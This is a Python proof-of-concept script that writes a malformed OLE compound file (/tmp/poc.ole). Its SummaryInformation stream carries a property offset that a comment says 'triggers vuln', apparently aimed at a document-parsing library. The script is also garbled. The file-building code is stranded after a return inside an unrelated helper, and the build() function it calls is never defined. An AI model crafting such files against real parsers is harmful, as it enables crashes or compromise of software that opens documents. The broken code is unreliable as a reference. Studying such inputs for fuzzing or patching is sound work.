import struct

def u16(s):
    return s.encode('utf-16-le')

    hdr = bytearray(512)
    hdr[0:8] = bytes([0xD0,0xCF,0x11,0xE0,0xA1,0xB1,0x1A,0xE1])
    struct.pack_into('<H', hdr, 24, 0x003E)
    struct.pack_into('<H', hdr, 26, 0x0003)
    struct.pack_into('<H', hdr, 28, 0xFFFE)
    struct.pack_into('<H', hdr, 30, 9)
    struct.pack_into('<H', hdr, 32, 6)
    struct.pack_into('<I', hdr, 44, 1)        # num_sectors_in_sat = 1
    struct.pack_into('<I', hdr, 48, 1)        # secid_first_directory = 1
    struct.pack_into('<I', hdr, 56, 4096)     # min_size_standard_stream
    struct.pack_into('<i', hdr, 60, -2)       # secid_first_sector_in_short_sat = ENDOFCHAIN
    struct.pack_into('<I', hdr, 64, 0)        # num_sectors_in_short_sat
    struct.pack_into('<i', hdr, 68, -2)       # secid_first_sector_in_master_sat = ENDOFCHAIN
    struct.pack_into('<I', hdr, 72, 0)        # num_sectors_in_master_sat
    struct.pack_into('<i', hdr, 76, 0)        # master_sat[0] = FAT at sector 0
    for i in range(1, 109):
        struct.pack_into('<i', hdr, 76 + 4*i, -1)

    fat = bytearray(512)
    struct.pack_into('<i', fat, 0, -3)   # sector 0 = FATSECT
    struct.pack_into('<i', fat, 4, -2)   # sector 1 = ENDOFCHAIN (directory)
    struct.pack_into('<i', fat, 8, -2)   # sector 2 = ENDOFCHAIN (root short stream)
    struct.pack_into('<i', fat, 12, -2)  # sector 3 = ENDOFCHAIN (summary stream)
    for i in range(4, 128):
        struct.pack_into('<i', fat, 4*i, -1)

    # Directory sector (sector 1, offset 1024)
    dirsec = bytearray(512)
    root = bytearray(128)
    name = u16("Root Entry") + b'\x00\x00'
    root[0:len(name)] = name
    struct.pack_into('<H', root, 64, len(name))
    root[66] = 5
    root[67] = 1
    struct.pack_into('<i', root, 68, -1)
    struct.pack_into('<i', root, 72, -1)
    struct.pack_into('<i', root, 76, 1)
    struct.pack_into('<i', root, 116, 2)  # d_stream_first_sector = 2 (short stream container)
    struct.pack_into('<I', root, 120, 512)
    dirsec[0:128] = root

    si = bytearray(128)
    siname = b'\x05\x00' + u16("SummaryInformation") + b'\x00\x00'
    si[0:len(siname)] = siname
    struct.pack_into('<H', si, 64, len(siname))
    si[66] = 2
    si[67] = 1
    struct.pack_into('<i', si, 68, -1)
    struct.pack_into('<i', si, 72, -1)
    struct.pack_into('<i', si, 76, -1)
    struct.pack_into('<i', si, 116, 3)  # d_stream_first_sector = 3
    struct.pack_into('<I', si, 120, 4096)
    dirsec[128:256] = si

    # Root short stream container (sector 2, offset 1536)
    shortstream = bytearray(512)

    # SummaryInformation stream (sector 3, offset 2048)
    stream = bytearray(512)
    struct.pack_into('<H', stream, 0, 0xFFFE)
    struct.pack_into('<H', stream, 2, 0)
    struct.pack_into('<H', stream, 4, 0)
    struct.pack_into('<H', stream, 6, 0)
    struct.pack_into('<I', stream, 24, 1)      # si_count = 1
    struct.pack_into('<I', stream, 44, 48)     # sd_offset = 48
    struct.pack_into('<I', stream, 48, 16)     # sh_len = 16
    struct.pack_into('<I', stream, 52, 1)      # sh_properties = 1
    struct.pack_into('<I', stream, 56, 0)      # pi_id = 0
    struct.pack_into('<I', stream, 60, 0)      # offset = 0  <-- triggers vuln

    out = bytearray()
    out += hdr
    out += fat
    out += dirsec
    out += shortstream
    out += stream
    return bytes(out)

data = build()
with open('/tmp/poc.ole', 'wb') as f:
    f.write(data)
print("wrote", len(data), "bytes")
